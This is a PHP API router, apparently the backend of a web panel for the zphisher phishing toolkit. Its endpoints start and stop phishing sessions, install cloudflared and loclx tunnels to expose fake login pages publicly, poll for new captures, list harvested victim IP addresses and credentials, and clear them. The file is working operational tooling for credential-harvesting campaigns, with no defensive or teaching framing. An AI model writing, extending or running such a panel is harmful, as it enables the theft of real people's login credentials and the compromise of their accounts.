<?php
declare(strict_types=1);

require_once dirname(__DIR__) . '/bootstrap.php';

header('Content-Type: application/json; charset=utf-8');
header('X-Content-Type-Options: nosniff');

function jsonResponse(array $data, int $code = 200): void
{
    http_response_code($code);
    echo json_encode($data, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    exit;
}

function readJsonBody(): array
{
    $raw = file_get_contents('php://input');
    if (!$raw) {
        return [];
    }
    $data = json_decode($raw, true);
    return is_array($data) ? $data : [];
}

$method = $_SERVER['REQUEST_METHOD'] ?? 'GET';
$path = parse_url($_SERVER['REQUEST_URI'] ?? '/', PHP_URL_PATH) ?: '/';
$path = preg_replace('#^/api#', '', $path) ?: '/';
$path = rtrim($path, '/') ?: '/';

try {
    if ($path === '/templates' && $method === 'GET') {
        jsonResponse(['ok' => true, 'groups' => TemplateCatalog::all()]);
    }

    if ($path === '/status' && $method === 'GET') {
        $active = SessionService::getActive();
        $port = DEFAULT_PHISH_PORT;
        if ($active) {
            $port = (int) $active['port'];
        }
        jsonResponse([
            'ok' => true,
            'panel_version' => PANEL_VERSION,
            'zphisher_version' => ZPHISHER_VERSION,
            'php_version' => PHP_VERSION,
            'os' => PHP_OS_FAMILY,
            'is_windows' => ProcessHelper::isWindows(),
            'storage_driver' => Store::driver(),
            'pdo_sqlite' => Store::hasSqlite(),
            'curl' => HttpClient::hasCurl(),
            'allow_url_fopen' => (bool) ini_get('allow_url_fopen'),
            'active_session' => $active,
            'phish_server_up' => ServerManager::isPortListening(DEFAULT_PHISH_HOST, $port),
            'cloudflared_installed' => is_file(BinaryInstaller::cloudflaredPath()),
            'loclx_installed' => is_file(BinaryInstaller::loclxPath()),
        ]);
    }

    if ($path === '/session/start' && $method === 'POST') {
        $body = readJsonBody();
        jsonResponse(SessionService::start($body));
    }

    if ($path === '/session/stop' && $method === 'POST') {
        jsonResponse(SessionService::stop());
    }

    if ($path === '/session/active' && $method === 'GET') {
        jsonResponse(['ok' => true, 'session' => SessionService::getActive()]);
    }

    if ($path === '/session/history' && $method === 'GET') {
        jsonResponse(['ok' => true, 'sessions' => SessionService::history()]);
    }

    if ($path === '/capture/poll' && $method === 'GET') {
        $active = SessionService::getActive();
        $sid = $active ? (int) $active['id'] : null;
        $new = CaptureService::poll($sid);
        jsonResponse(['ok' => true, 'new' => $new]);
    }

    if ($path === '/captures/ips' && $method === 'GET') {
        jsonResponse(['ok' => true, 'items' => CaptureService::listIps()]);
    }

    if ($path === '/captures/credentials' && $method === 'GET') {
        jsonResponse(['ok' => true, 'items' => CaptureService::listCreds()]);
    }

    if ($path === '/captures/clear' && $method === 'POST') {
        CaptureService::clearAll();
        jsonResponse(['ok' => true]);
    }

    if ($path === '/settings' && $method === 'GET') {
        jsonResponse([
            'ok' => true,
            'loclx_token_set' => TunnelManager::getLoclxToken() !== null,
            'default_port' => DEFAULT_PHISH_PORT,
        ]);
    }

    if ($path === '/settings' && $method === 'POST') {
        $body = readJsonBody();
        if (isset($body['loclx_token'])) {
            Store::setSetting('loclx_token', trim((string) $body['loclx_token']));
        }
        jsonResponse(['ok' => true]);
    }

    if ($path === '/tools/install-cloudflared' && $method === 'POST') {
        jsonResponse(BinaryInstaller::ensureCloudflared());
    }

    if ($path === '/tools/install-loclx' && $method === 'POST') {
        jsonResponse(BinaryInstaller::ensureLoclx());
    }

    if ($path === '/tools/check-update' && $method === 'GET') {
        $latest = ZPHISHER_VERSION;
        $body = HttpClient::get('https://api.github.com/repos/htr-tech/zphisher/releases/latest', 8);
        if (is_string($body) && preg_match('/"tag_name"\s*:\s*"v?([^"]+)"/', $body, $m)) {
            $latest = $m[1];
        }
        jsonResponse([
            'ok' => true,
            'current' => ZPHISHER_VERSION,
            'latest' => $latest,
            'update_available' => version_compare($latest, ZPHISHER_VERSION, '>'),
        ]);
    }

    jsonResponse(['ok' => false, 'error' => 'Not found'], 404);
} catch (Throwable $e) {
    jsonResponse(['ok' => false, 'error' => $e->getMessage()], 500);
}
